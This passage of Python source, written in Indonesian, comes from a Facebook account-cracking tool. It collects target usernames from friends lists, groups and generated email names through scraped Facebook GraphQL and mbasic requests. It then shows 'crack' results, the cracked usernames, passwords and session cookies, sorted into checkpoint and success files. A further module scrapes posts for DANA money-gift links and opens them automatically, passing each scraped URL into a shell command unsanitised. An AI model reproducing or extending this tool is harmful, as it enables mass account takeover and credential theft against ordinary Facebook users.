                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                        Pilihan().Settingan()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '8' or choose == '08':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Username Akun Target[italic white], Pastikan Akun[italic red] Tersedia[italic white] Dan Username[italic red] Benar[italic white], Misalnya :[italic green] rozhak.official", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input Username)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    username = Console().input("[bold dodger_blue3]   ╰─> ")
                    if 'facebook.com/' in str(username):
                        self.username = username.split('facebook.com/')[1]
                        if '/' in str(self.username):
                            self.username_ = self.username.split('/')[0]
                        else:
                            self.username_ = self.username
                    else:
                        self.username_ = username
                    Convert().To_Userid(self.cookies, self.username_)
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '9' or choose == '09':
                try:
                    self.all_hasil, self.jumlah, self.join_string, self.checkpoint, self.success = os.listdir('Results'), 0, [], [], []
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("""[bold green]01[bold white]. Lihat Hasil Crack Checkpoint
[bold green]02[bold white]. Lihat Hasil Crack Success
[bold green]03[bold white]. Keluar ([bold red]Exit[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Lihat Hasil Crack)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    choose2 = Console().input("[bold dodger_blue3]   ╰─> ")
                    if choose2 == '1' or choose2 == '01':
                        for z in self.all_hasil:
                            if 'cp' in str(z).lower():
                                self.checkpoint.append(f'Results/{z}')
                                self.jumlah += 1
                                self.join_string.append(Panel(f"[italic green]{self.jumlah}[bold white]. {str(z)}", width = 32))
                            else:
                                continue
                        Console(width = 65, style = "bold dodger_blue3").print(Columns(self.join_string))
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Nomor[italic white] Pada File Yang Tersedia Di List, Hanya Memasukan[italic red] Angka[italic white], Misalnya :[italic green] 4 *Empat", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input List)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        tanya = int(Console().input("[bold dodger_blue3]   ╰─> "))
                        self.file = open(self.checkpoint[tanya - 1], 'r').read().splitlines()
                        if len(self.file) == 0:
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]File Tersebut Tidak Terdapat Hasil Crack Checkpoint Nya!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](File Kosong)[bold green] <[bold yellow]<[bold red]<"));exit()
                        else:
                            for z in self.file:
                                if len(str(z)) == 0:
                                    continue
                                else:
                                    self.username, self.password, self.useragent = z.split('|')[0], z.split('|')[1], z.split('|')[2]
                                    tree = Tree(Panel.fit("[bold red]RESULTS CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                                    tree.add(Columns([Panel(f"[bold red]{self.username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{self.password}", style = "bold dodger_blue3", width = 30)]))
                                    tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                                    print(tree)
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Kamu Memiliki[italic red] {len(self.file)}[italic white] Hasil Crack[italic red] Checkpoint[italic white], Untuk Melihat File Secara Manual Ketik[italic green] cat {self.checkpoint[tanya - 1]}[italic white]!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                            exit()
                    elif choose2 == '2' or choose2 == '02':
                        for z in self.all_hasil:
                            if 'ok' in str(z).lower():
                                self.success.append(f'Results/{z}')
                                self.jumlah += 1
                                self.join_string.append(Panel(f"[italic green]{self.jumlah}[bold white]. {str(z)}", width = 32))
                            else:
                                continue
                        Console(width = 65, style = "bold dodger_blue3").print(Columns(self.join_string))
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Nomor[italic white] Pada File Yang Tersedia Di List, Hanya Memasukan[italic red] Angka[italic white], Misalnya :[italic green] 4 *Empat", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input List)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        tanya = int(Console().input("[bold dodger_blue3]   ╰─> "))
                        self.file = open(self.success[tanya - 1], 'r').read().splitlines()
                        if len(self.file) == 0:
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]File Tersebut Tidak Terdapat Hasil Crack Success Nya!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](File Kosong)[bold green] <[bold yellow]<[bold red]<"));exit()
                        else:
                            for z in self.file:
                                if len(str(z)) == 0:
                                    continue
                                else:
                                    self.username, self.password, self.cookies = z.split('|')[0], z.split('|')[1], z.split('|')[2]
                                    tree = Tree(Panel.fit("[bold green]RESULTS SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                                    tree.add(Columns([Panel(f"[bold green]{self.username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{self.password}", style = "bold dodger_blue3", width = 30)]))
                                    tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                                    print(tree)
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Kamu Memiliki[italic green] {len(self.file)}[italic white] Hasil Crack[italic green] Success[italic white], Untuk Melihat File Secara Manual Ketik[italic green] cat {self.success[tanya - 1]}[italic white]!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                            exit()
                    elif choose2 == '3' or choose2 == '03':
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Selamat Tinggal, Terimakasih Telah Menggunakan Tools Saya!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Keluar)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilihan Tidak Diketahui)[bold green] <[bold yellow]<[bold red]<"))
                        time.sleep(4.5)
                        self.Utama()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '10':
                try:
                    if self.status == 'Premium':
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Nama Group Target Gunakan Koma Untuk Memasukan Beberapa Nama, Seperti :[italic green] Termux,Kali Linux[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        nama = Console().input("[bold dodger_blue3]   ╰─> ")
                        for name in nama.split(','):
                            Dumps_GraphQL().Group_From_Query(self.cookies, name)
                        if len(Dump) == 0 or len(Dump) < 10:
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 10 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                            exit()
                        else:
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                            Pilihan().Settingan()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Bukan Premium)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '11':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Nama Dan Domain Gunakan \"[italic red]|[italic white]\" Sebagai Pemisah Antara Nama Dan Domain, Seperti :[italic green] Rozhak|@gmail.com[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    your_name = Console().input("[bold dodger_blue3]   ╰─> ").replace(' ', '')
                    self.nama_depan, self.domain = your_name.split('|')[0], your_name.split('|')[1]
                    Dumps_GraphQL().Emails(str(self.nama_depan).lower(), self.domain)
                    if len(Dump) == 0 or len(Dump) < 100:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 100 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                        Pilihan().Settingan()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '12':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Pencarian https://mbasic.facebook.com/ ([bold green]Mbasic[bold white])
[bold green]02[bold white]. Gunakan Pencarian https://web.facebook.com/ ([bold red]GraphQL[bold white])""", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilih Pencarian)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    pencarian = Console().input("[bold dodger_blue3]   ╰─> ")
                    if pencarian == '01' or pencarian == '1':
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Jeda Dalam Membuka Aplikasi[italic red] Dana[italic white], Saya Menyarankan Untuk Menggunakan 60 Detik, Misalnya :[italic green] 120 Detik", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Jeda Membuka Aplikasi)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        jeda_membuka_link = int(Console().input("[bold dodger_blue3]   ╰─> "))
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Jeda Dalam Pencarian Link, Gunakan Lebih Dari[italic red] 2 Menit[italic white] Agar Terhindar Dari Spam, Misalnya :[italic green] 360 Detik", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Jeda Pencarian)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        jeda_pencarian = int(Console().input("[bold dodger_blue3]   ╰─> "))
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Pertanyaan Khusus Untuk Mencari Dana Kaget, Misalnya :[italic green] dana id kaget,dana kaget,link dana id", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pertanyaan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        pertanyaan = Console().input("[bold dodger_blue3]   ╰─> ")
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Sedang Mencari Link Dana Kaget, Anda Bisa Menggunakan[italic green] CTRL + C[italic white] Jika Stuck Dan[italic red] CTRL + Z[italic white] Jika Ingin Berhenti!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                        Dana().Kaget_Mbasic(self.cookies, pertanyaan, jeda_membuka_link, jeda_pencarian)
                    else:
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Jeda Dalam Membuka Aplikasi[italic red] Dana[italic white], Saya Menyarankan Untuk Menggunakan 60 Detik, Misalnya :[italic green] 120 Detik", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Jeda Membuka Aplikasi)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        jeda_membuka_link = int(Console().input("[bold dodger_blue3]   ╰─> "))
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Jeda Dalam Pencarian Link, Gunakan Lebih Dari[italic red] 2 Menit[italic white] Agar Terhindar Dari Spam, Misalnya :[italic green] 360 Detik", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Jeda Pencarian)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        jeda_pencarian = int(Console().input("[bold dodger_blue3]   ╰─> "))
                        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Pertanyaan Khusus Untuk Mencari Dana Kaget, Misalnya :[italic green] dana id kaget,dana kaget,link dana id", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pertanyaan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                        pertanyaan = Console().input("[bold dodger_blue3]   ╰─> ")
                        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Sedang Mencari Link Dana Kaget, Anda Bisa Menggunakan[italic green] CTRL + C[italic white] Jika Stuck Dan[italic red] CTRL + Z[italic white] Jika Ingin Berhenti!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                        Dana().Kaget_GraphQL(self.cookies, urllib.request.quote(pertanyaan), jeda_membuka_link, jeda_pencarian)
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            elif choose == '13':
                try:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Sedang Mencoba Untuk Menghapus Cookies Dan Apikey Kamu...", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Keluar)[bold green] <[bold yellow]<[bold red]<"))
                    os.remove('Data/Cookie.json')
                    os.remove('Data/Apikey.json')
                    time.sleep(1.5)
                    exit()
                except (Exception) as e:
                    exit()
            else:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilihan Tidak Diketahui)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                self.Utama()
        else:
            try:
                Banner()
                self.apikey = json.loads(open('Data/Apikey.json', 'r').read())['Apikey']
                self.status, self.email, self.joined, self.expired = Think_Facebook().Validasi(self.apikey, platform())
                try:
                    self.cookies, self.access_token = json.loads(open('Data/Cookie.json', 'r').read())['Cookie'], json.loads(open('Data/Token.json', 'r').read())['Token']
                    self.name, self.user = Login().Akun_Saya(self.access_token, self.cookies)
                    self.ip, self.org = Login().Get_Provider()
                except (Exception) as e:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic blue]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                    time.sleep(7.5)
                    Login().Cookies()
                Console(width = 65, style = "bold dodger_blue3").print(Columns([
                    Panel(f"""[bold white]Status :[bold yellow] {self.status[:19]}
[bold white]Expired :[bold red] {self.expired[:18]}
[bold white]Joined :[bold green] {self.joined[:19]}""", width = 32),
                    Panel(f"""[bold white]Name :[bold green] {self.name[:21]}
[bold white]IP :[bold red] {self.ip[:23]}
[bold white]User :[bold green] {self.user[:21]}""", width = 32),
                ]))
            except (Exception) as e:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                time.sleep(7.5)
                Think_Facebook().Apikey()

            self.jumlah, self.online = Login().Pengguna()

            try:
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan Uid Akun Facebook Target Pastikan Memiliki Teman Dan Dapat Terlhat Oleh Publik Anda Juga Dapat Menggunakan Koma Untuk Dump Masal, Seperti :[italic green] 100006609458697,757953543[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Stop!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                userid = Console().input("[bold dodger_blue3]   ╰─> ")
                for user_ids in userid.split(','):
                    if user_ids.isnumeric() == True:
                        Dumps_Graph().Friends_Count(self.access_token, self.cookies, user_ids, after = '')
                    else:
                        continue
                if len(Dump) == 0 or len(Dump) < 200:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]Untuk Jumlah Username Yang Terkumpul Harus Lebih Dari 200 Username, Silahkan Untuk Mencari Target Yang Benar!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Jumlah Username :[italic green] {len(Dump)}"))
                    Pilihan().Settingan()
            except (Exception) as e:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Error)[bold green] <[bold yellow]<[bold red]<"))
                exit()

class Dana:

    def __init__(self) -> None:
        pass

    def Kaget_GraphQL(self, cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2):
        try:
            print(f"[bold dodger_blue3]   ╰─>[bold green] Sedang Mencari Link...", end='\r')
            time.sleep(1.0)
            with requests.Session() as r:
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9',
                    'accept-encoding': 'gzip, deflate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-user': '?1',
                    'sec-fetch-mode': 'navigate',
                    'connection': 'keep-alive',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'Host': 'web.facebook.com',
                    'upgrade-insecure-requests': '1',
                })
                response = r.get('https://web.facebook.com/search/posts/?q={}'.format(pertanyaan), cookies = {
                    'cookie': cookies
                })
                self.__spin_r__spin_b___spin_t = re.search('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response.text).replace('\\', ''))
                self.__spin_r, self.__spin_b, self.__spin_t = self.__spin_r__spin_b___spin_t.group(1), self.__spin_r__spin_b___spin_t.group(2), self.__spin_r__spin_b___spin_t.group(3)
                self.__user = re.search('__user=(\d+)&', str(response.text).replace('\\', '')).group(1)
                self.__hs = re.search('"haste_session":"(.*?)",', str(response.text).replace('\\', '')).group(1)
                self.__hsi = re.search('"hsi":"(\d+)",', str(response.text).replace('\\', '')).group(1)
                self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)",', str(response.text).replace('\\', '')).group(1)
                self.jazoest = re.search('&jazoest=(\d+)",', str(response.text).replace('\\', '')).group(1)
                self.lsd = re.search('"LSD":{"token":"(.*?)"},', str(response.text).replace('\\', '')).group(1)

                self.all_external_url = re.findall('https://link.*?dana.*?id/(.*?)"', str(response.text).replace('\\', ''))
                for url in self.all_external_url:
                    try:
                        if 'kaget?' in str(url):
                            if 'https://link.dana.id/{}'.format(url) in str(open('Data/Daget.txt', 'r').read().splitlines()):
                                continue
                            else:
                                print(f"[bold dodger_blue3]   ╰─>[bold green] Membuka Link https://link.dana.id/{str(url)[:5]}...", end='\r')
                                time.sleep(1.0)
                                os.system(f'xdg-open https://link.dana.id/{url}')
                                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Status :[italic green] Successfully got the link...[/]
[bold white]Link :[bold red] https://link.dana.id/{url}""", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Sukses)[bold green] <[bold yellow]<[bold red]<"))
                                open('Data/Daget.txt', 'a+').write(f'https://link.dana.id/{url}\n')
                                time.sleep(int(jeda_pengulangan))
                        else:
                            continue
                    except (Exception):
                        continue
                self.Next_Kaget_GraphQL(cookies, pertanyaan, self.__user, self.__hs, self.__hsi, self.fb_dtsg, self.jazoest, self.lsd, self.__spin_r, self.__spin_b, self.__spin_t, jeda_pengulangan, jeda_pengulangan2)
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            time.sleep(2.5)
            self.Kaget_GraphQL(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ╰─>bold red] Koneksi Error!", end='\r')
            time.sleep(10.5)
            self.Kaget_GraphQL(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)

    def Next_Kaget_GraphQL(self, cookies, pertanyaan, __user, __hs, __hsi, fb_dtsg, jazoest, lsd, __spin_r, __spin_b, __spin_t, jeda_pengulangan, jeda_pengulangan2):
        with requests.Session() as r:
            r.headers.update({
                'referer': f'https://web.facebook.com/search/posts/?q={pertanyaan}',
                'accept-language': 'id,en;q=0.9',
                'Host': 'web.facebook.com',
                'sec-fetch-site': 'same-origin',
                'x-fb-lsd': lsd,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-fetch-mode': 'cors',
                'x-fb-friendly-name': 'SearchCometResultsInitialResultsQuery',
                'accept': '*/*',
                'connection': 'keep-alive',
                'sec-fetch-dest': 'empty',
                'x-asbd-id': '129477',
                'dpr': '1.5',
                'origin': 'https://web.facebook.com',
                'accept-encoding': 'gzip, deflate',
                'content-type': 'application/x-www-form-urlencoded',
            })
            data = (f'av={__user}&__user={__user}&__a=1&__req=6&__hs={urllib.request.quote(__hs)}&dpr=1.5&__ccg=EXCELLENT&__rev={__spin_r}&__s=&__hsi={urllib.request.quote(__hsi)}&__dyn=&__csr=&__comet_req=15&fb_dtsg={urllib.request.quote(fb_dtsg)}&jazoest={jazoest}&lsd={urllib.request.quote(lsd)}&__aaid=0&__spin_r={__spin_r}&__spin_b={__spin_b}&__spin_t={__spin_t}&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=SearchCometResultsInitialResultsQuery&variables=%7B%22count%22%3A5%2C%22allow_streaming%22%3Afalse%2C%22args%22%3A%7B%22callsite%22%3A%22COMET_GLOBAL_SEARCH%22%2C%22config%22%3A%7B%22exact_match%22%3Afalse%2C%22high_confidence_config%22%3Anull%2C%22intercept_config%22%3Anull%2C%22sts_disambiguation%22%3Anull%2C%22watch_config%22%3Anull%7D%2C%22context%22%3A%7B%22bsid%22%3A%22{uuid.uuid4()}%22%2C%22tsid%22%3Anull%7D%2C%22experience%22%3A%7B%22encoded_server_defined_params%22%3Anull%2C%22fbid%22%3Anull%2C%22type%22%3A%22POSTS_TAB%22%7D%2C%22filters%22%3A%5B%22%7B%5C%22name%5C%22%3A%5C%22recent_posts%5C%22%2C%5C%22args%5C%22%3A%5C%22%5C%22%7D%22%5D%2C%22text%22%3A%22{pertanyaan}%22%7D%2C%22cursor%22%3Anull%2C%22feedbackSource%22%3A23%2C%22fetch_filters%22%3Atrue%2C%22renderLocation%22%3A%22search_results_page%22%2C%22scale%22%3A1.5%2C%22stream_initial_count%22%3A0%2C%22useDefaultActor%22%3Afalse%2C%22__relay_internal__pv__IsWorkUserrelayprovider%22%3Afalse%2C%22__relay_internal__pv__IsMergQAPollsrelayprovider%22%3Afalse%2C%22__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider%22%3Afalse%2C%22__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider%22%3Afalse%2C%22__relay_internal__pv__StoriesRingrelayprovider%22%3Afalse%7D&server_timestamps=true&doc_id=6596374833791983')
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.all_external_url = re.findall('https://link.*?dana.*?id/(.*?)"', str(response.text).replace('\\', ''))
            self.all_publish_time = re.findall('"publish_time":(\d+),"story_name":', str(response.text).replace('\\', ''))
            for url in self.all_external_url:
                try:
                    if 'kaget?' in str(url):
                        if 'https://link.dana.id/{}'.format(url) in str(open('Data/Daget.txt', 'r').read().splitlines()):
                            continue
                        else:
                            print(f"[bold dodger_blue3]   ╰─>[bold green] Membuka Link https://link.dana.id/{str(url)[:5]}...", end='\r')
                            time.sleep(1.0)
                            os.system(f'xdg-open https://link.dana.id/{url}')
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Status :[italic green] Successfully got the link...[/]
[bold white]Link :[bold red] https://link.dana.id/{url}""", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Sukses)[bold green] <[bold yellow]<[bold red]<"))
                            open('Data/Daget.txt', 'a+').write(f'https://link.dana.id/{url}\n')
                            time.sleep(int(jeda_pengulangan))
                    else:
                        continue
                except (Exception):
                    continue
            Count = 1
            for times in self.all_publish_time:
                self.string_time = datetime.datetime.fromtimestamp(int(times))
                if len(self.all_publish_time) == int(Count):
                    self.start_time = datetime.datetime.strptime(str(self.string_time), "%Y-%m-%d %H:%M:%S")
                    self.end_time = datetime.datetime.strptime(str(datetime.datetime.now()).split('.')[0], "%Y-%m-%d %H:%M:%S")
                    self.time_difference = (self.start_time - self.end_time)
                    if '-' in str(self.time_difference.total_seconds()) or self.time_difference.total_seconds() > 600:
                        print(f"[bold dodger_blue3]   ╰─>[bold yellow] Sedang Mencari Link...", end='\r')
                        time.sleep(1.0)
                        time.sleep(jeda_pengulangan2)
                        self.Kaget_GraphQL(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)
                    else:
                        continue
                else:
                    Count += 1
                    continue

    def Kaget_Mbasic(self, cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2):
        try:
            print(f"[bold dodger_blue3]   ╰─>[bold green] Sedang Mencari Link...", end='\r')
            time.sleep(1.0)
            with requests.Session() as r:
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9',
                    'accept-encoding': 'gzip, deflate',
                    'sec-fetch-site': 'none',
                    'cache-control': 'max-age=0',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-user': '?1',
                    'sec-fetch-mode': 'navigate',
                    'connection': 'keep-alive',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'Host': 'mbasic.facebook.com',
                    'upgrade-insecure-requests': '1',
                })
                response = r.get('https://mbasic.facebook.com/search/posts/?q={}&source=filter&isTrending=0&lul&paipv=0&eav=&_rdr'.format(pertanyaan.replace(' ', '+')), cookies = {
                    'cookie': cookies
                })
                self.find_dana_kaget = re.findall('href="(.*?)"', str(response.text))
                for link in self.find_dana_kaget:
                    try:
                        self.string_url = urllib.parse.unquote(link)
                        if 'link.dana.id' in str(self.string_url):
                            self.final_daget = re.search('u=(.*?)&r=', str(self.string_url)).group(1)
                            if str(self.final_daget) in str(open('Data/Daget.txt', 'r').read().splitlines()):
                                continue
                            else:
                                print(f"[bold dodger_blue3]   ╰─>[bold green] Membuka Link {self.final_daget}...", end='\r')
                                time.sleep(1.0)
                                os.system(f'xdg-open {self.final_daget}')
                                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Status :[italic green] Successfully got the link...[/]
[bold white]Link :[bold red] {self.final_daget}""", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Sukses)[bold green] <[bold yellow]<[bold red]<"))
                                open('Data/Daget.txt', 'a+').write(f'{self.final_daget}\n')
                                time.sleep(int(jeda_pengulangan))
                        else:
                            continue
                    except (Exception):
                        continue
                if 'cursor=' in str(response.text):
                    self.next_cursor = re.search('cursor=(.*?)&', str(response.text)).group(1).replace('&amp;', '')
                    self.usid = re.search('usid=(.*?)&', str(response.text)).group(1).replace('&amp;', '')
                    self.pn = re.search('pn=(.*?)&', str(response.text)).group(1).replace('&amp;', '')
                    print(f"[bold dodger_blue3]   ╰─>[bold yellow] Sedang Mencari Link...", end='\r')
